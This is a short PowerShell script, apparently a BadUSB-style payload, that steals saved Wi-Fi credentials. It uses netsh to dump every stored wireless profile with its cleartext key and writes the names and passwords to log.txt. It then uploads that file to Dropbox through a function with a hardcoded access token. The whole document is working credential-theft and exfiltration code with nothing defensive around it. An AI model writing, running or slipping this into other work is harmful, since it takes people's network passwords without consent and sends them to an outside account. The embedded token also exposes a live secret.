function DropBox-Upload {

	[CmdletBinding()]
	param (
		
	[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
	[Alias("f")]
	[string]$SourceFilePath
	) 
	$DropBoxAccessToken = "sl.BbjAO35KpqmNZqDZ6Eps4P0UfzLLwn96YYoN9N5F8_8eh5sKInnRqhBZVFY3xoWeCb16gVVcSU7whTQfs6imLZAYSfjql9Nk5FTd05JgCLamp7xb2xS2JqjqJ8yydojrNVukTYYh"
	$outputFile = Split-Path $SourceFilePath -leaf
	$TargetFilePath="/$outputFile"
	$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
	$authorization = "Bearer " + $DropBoxAccessToken
	$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
	$headers.Add("Authorization", $authorization)
	$headers.Add("Dropbox-API-Arg", $arg)
	$headers.Add("Content-Type", 'application/octet-stream')
	Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}
(netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> log.txt
"C:\Windows\System32\log.txt" |  DropBox-Upload
